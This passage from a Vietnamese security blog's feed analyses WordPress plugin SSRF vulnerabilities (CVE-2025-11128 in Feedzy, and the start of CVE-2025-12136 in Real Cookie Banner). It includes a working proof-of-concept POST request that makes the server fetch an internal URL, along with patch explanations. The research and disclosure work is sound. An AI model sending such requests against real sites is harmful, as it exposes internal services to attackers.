d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;    A[&amp;#34;User input via /feedzy/v1/feed (REST API)&amp;#34;] --&amp;gt; B[&amp;#34;feedzy_sanitize_feeds()&amp;#34;]&#xA;    B --&amp;gt; C[&amp;#34;esc_url() → no internal host validation&amp;#34;]&#xA;    C --&amp;gt; D[&amp;#34;feedzy_rest_route()&amp;#34;]&#xA;    D --&amp;gt; E[&amp;#34;Feedzy_Rss_Feeds::instance()&amp;#34;]&#xA;    E --&amp;gt; F[&amp;#34;$admin-&amp;gt;fetch_feed(url)&amp;#34;]&#xA;    F --&amp;gt; G{&amp;#34;feedzy_amazon_get_locale_hosts() exists?&amp;#34;}&#xA;    G -- No --&amp;gt; H[&amp;#34;init_feed()&amp;#34;]&#xA;    H --&amp;gt; I[&amp;#34;Feedzy_Rss_Feeds_Util_SimplePie::init()&amp;#34;]&#xA;    I --&amp;gt; J[&amp;#34;fetch_data(cache)&amp;#34;]&#xA;    J --&amp;gt; K[&amp;#34;HTTP request to user-controlled URL → SSRF&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, request, send_from_directory, Response&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;, methods=[&amp;#39;GET&amp;#39;])&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;@app.route(&amp;#39;/feed&amp;#39;, methods=[&amp;#39;GET&amp;#39;])&#xA;def feed():&#xA;    xml_content = &amp;#34;&amp;#34;&amp;#34;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&#xA;    &amp;lt;rss version=&amp;#34;2.0&amp;#34;&amp;gt;&#xA;      &amp;lt;channel&amp;gt;&#xA;        &amp;lt;title&amp;gt;Example Feed&amp;lt;/title&amp;gt;&#xA;        &amp;lt;link&amp;gt;https://example.com&amp;lt;/link&amp;gt;&#xA;        &amp;lt;description&amp;gt;This is a sample RSS feed generated by Flask.&amp;lt;/description&amp;gt;&#xA;        &amp;lt;item&amp;gt;&#xA;          &amp;lt;title&amp;gt;First item&amp;lt;/title&amp;gt;&#xA;          &amp;lt;link&amp;gt;https://example.com/item1&amp;lt;/link&amp;gt;&#xA;          &amp;lt;description&amp;gt;Hello world!&amp;lt;/description&amp;gt;&#xA;        &amp;lt;/item&amp;gt;&#xA;        &amp;lt;item&amp;gt;&#xA;          &amp;lt;title&amp;gt;Second item&amp;lt;/title&amp;gt;&#xA;          &amp;lt;link&amp;gt;https://example.com/item2&amp;lt;/link&amp;gt;&#xA;          &amp;lt;description&amp;gt;Another entry.&amp;lt;/description&amp;gt;&#xA;        &amp;lt;/item&amp;gt;&#xA;      &amp;lt;/channel&amp;gt;&#xA;    &amp;lt;/rss&amp;gt;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    return Response(xml_content, mimetype=&amp;#39;application/xml&amp;#39;)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login bằng tài khoản Contributor&lt;/li&gt;&#xA;&lt;li&gt;Gửi POST request với URL trỏ đến local service:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/feedzy/v1/feed HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F&amp;amp;reauth=1&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cdf597bffe4c239d9e871b2ac98a2d427df0fb82dc7a09099bc026fbbff641ad1; wp-settings-time-2=1761542750; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-time-3=1761591693; wp-settings-3=mfold%3Do; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cd42e05305965ebb0efad0d1374e9552219c641afb6452531634d3b4e414c6a48; wp_lang=en_US&#xA;&#xA;url[0]=http://localhost:8001/feed&amp;amp;category=cat&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/result.png&#34; title=&#34;Nội dung đọc được từ local service&#34; data-thumbnail=&#34;/posts/2025-10-30-cve-2025-11128/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Nội dung đọc được từ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-30-cve-2025-11128/result.png&#39; alt=&#34;Result&#34; height=&#34;938&#34; width=&#34;1536&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nội dung đọc được từ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi chú&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Nếu thử &lt;code&gt;url&lt;/code&gt; với file không phải dạng XML, ta nhận được response:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/metadata.png&#34; title=&#34;Kết quả khi file không thuộc dạng XML&#34; data-thumbnail=&#34;/posts/2025-10-30-cve-2025-11128/metadata.png&#34; data-sub-html=&#34;&lt;h2&gt;Metadata&lt;/h2&gt;&lt;p&gt;Kết quả khi file không thuộc dạng XML&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-30-cve-2025-11128/metadata.png&#39; alt=&#34;Metadata&#34; height=&#34;569&#34; width=&#34;1536&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả khi file không thuộc dạng XML&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-11128&lt;/strong&gt; trong plugin &lt;strong&gt;Feedzy RSS Aggregator&lt;/strong&gt; xuất phát từ việc xử lý URL không an toàn trong REST API &lt;code&gt;/feedzy/v1/feed&lt;/code&gt;.&#xA;Hàm &lt;code&gt;feedzy_sanitize_feeds()&lt;/code&gt; chỉ dùng &lt;code&gt;esc_url()&lt;/code&gt; mà không xác minh địa chỉ, cho phép attacker có quyền &lt;strong&gt;Subscriber&lt;/strong&gt; gửi yêu cầu SSRF đến các dịch vụ nội bộ.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá &lt;strong&gt;5.1.1&lt;/strong&gt; khắc phục bằng cách sử dụng &lt;code&gt;wp_http_validate_url()&lt;/code&gt;, thắt chặt quyền truy cập API qua &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt; và thay &lt;code&gt;esc_url()&lt;/code&gt; bằng &lt;code&gt;esc_url_raw()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;esc_url()&lt;/code&gt; không đủ để xác minh URL đầu vào.&lt;/li&gt;&#xA;&lt;li&gt;REST API cần được giới hạn quyền truy cập phù hợp.&lt;/li&gt;&#xA;&lt;li&gt;Cần xác minh và lọc URL để ngăn SSRF đến mạng nội bộ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/feedzy-rss-feeds/vulnerability/wordpress-feedzy-rss-feeds-lite-plugin-5-1-0-authenticated-subscriber-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Feedzy Plugin &amp;lt;= 5.1.0 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-12136 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-29-cve-2025-12136/</link>
      <pubDate>Wed, 29 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-29-cve-2025-12136/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin The Real Cookie Banner: GDPR &amp;amp; ePrivacy Cookie Consent cho WordPress bị lỗ hổng &lt;strong&gt;Server-Side Request Forgery&lt;/strong&gt; trong tất cả các phiên bản đến và bao gồm 5.2.4. Nguyên nhân là do kiểm tra không đầy đủ URL do người dùng cung cấp tại REST API endpoint &lt;code&gt;/scanner/scan-without-login&lt;/code&gt;. Điều này cho phép những kẻ tấn công đã xác thực, có quyền truy cập cấp administrator trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn và sửa đổi thông tin từ các dịch vụ nội bộ thông qua tham số &lt;code&gt;url&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12136&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12136&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.2.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.2.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/real-cookie-banner/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Real Cookie Banner Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Real Cookie Banner&lt;/strong&gt;: &lt;strong&gt;5.2.4&lt;/strong&gt; (vulnerable) và &lt;strong&gt;5.2.5&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function routeScanWithoutLogin($request)&#xA;{&#xA;    $url = $request-&amp;gt;get_param(&amp;#39;url&amp;#39;);&#xA;    $jobId = $request-&amp;gt;get_param(&amp;#39;jobId&amp;#39;);&#xA;    if ($checker-&amp;gt;start($url, \false)) {&#xA;        $requestArguments = $checker-&amp;gt;getRequestArguments();&#xA;        $result = \wp_remote_get($url, [&amp;#39;redirection&amp;#39; =&amp;gt; 0, &amp;#39;cookies&amp;#39; =&amp;gt; $requestArguments[&amp;#39;cookies&amp;#39;], &amp;#39;headers&amp;#39; =&amp;gt; $requestArguments[&amp;#39;headers&amp;#39;], &amp;#39;timeout&amp;#39; =&amp;gt; $requestArguments[&amp;#39;timeout&amp;#39;], &amp;#39;sslverify&amp;#39; =&amp;gt; $requestArguments[&amp;#39;sslverify&amp;#39;]]);&#xA;        $status = \wp_remote_retrieve_response_code($result);&#xA;    &#xA;        $ok = $status &amp;gt;= 200 